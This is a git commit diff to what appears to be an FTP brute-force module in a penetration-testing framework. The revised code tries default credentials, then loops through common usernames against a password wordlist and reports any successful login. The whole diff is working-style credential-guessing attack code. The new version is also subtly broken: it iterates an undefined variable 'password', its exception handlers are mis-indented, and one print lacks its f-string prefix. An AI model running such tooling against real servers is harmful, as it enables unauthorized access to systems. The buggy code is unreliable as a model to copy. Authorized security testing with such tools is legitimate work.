61af49b1239550f49bb0c6c0202c71dfad7c2ca5
Elzy <elzyproot@protonmail.com>
2026-02-11 03:19:15 +0700

    Update ftp_brute.py
    Logic handling changes

--- modules/auxiliary/brute/ftp/ftp_brute.py
+++ modules/auxiliary/brute/ftp/ftp_brute.py
@@ -11,14 +11,14 @@ REQUIRED_OPTIONS = {
 def test_ftp(target_ip, port, username, password):
     ftp = ftplib.FTP()
     try:
-        ftp.connect(target_ip, int(port), timeout=2)
+        ftp.connect(target_ip, int(port), timeout=3)
         ftp.login(username, password)
+        ftp.quit()
         return True
     except:
-        return False
-    finally:
-        try: ftp.quit()
+        try: ftp.close() 
         except: pass
+        return False
 
 def execute(options):
     target_ip = options.get("IP")
@@ -26,18 +26,24 @@ def execute(options):
     wordlist_path = options.get("PASS")
 
     print(f"{C.HEADER} \n--- FTP BRUTE FORCE: {target_ip} ---")
+    try:
+        for user, passwd in DEFAULT_CREDS:
+            if test_ftp(target_ip, port, user, passwd):
+                print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
+                return
+                
+        if wordlist_path and os.path.exists(wordlist_path):
+            with open(wordlist_path, 'r', errors='ignore') as f:
+                passwords = [line.strip() for line in f if line.strip()]
+                
+                for user in COMMON_USERS:
+                    print(f"{C.MENU}  [*] Testing user: {user}")
+                    for pw in password:
+                        if test_ftp(target_ip, port, user, pw):
+                            print(f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
+                            return
 
-    for user, passwd in DEFAULT_CREDS:
-        if test_ftp(target_ip, port, user, passwd):
-            print(f"{C.SUCCESS}  [+] LOGIN SUCCESS! -> U:{user} P:{passwd}")
-            return
-
-    if wordlist_path and os.path.exists(wordlist_path):
-        with open(wordlist_path, 'r') as f:
-            for user in COMMON_USERS:
-                f.seek(0)
-                for line in f:
-                    pw = line.strip()
-                    if test_ftp(target_ip, port, user, pw):
-                        print(f"{C.SUCCESS} \n  [+] LOGIN SUCCESS! -> U:{user} P:{pw}")
-                        return
+     except KeyboardInterrupt:
+         return
+     except Exception as e:
+         print("{C.ERROR}[x] ERROR: {e}")
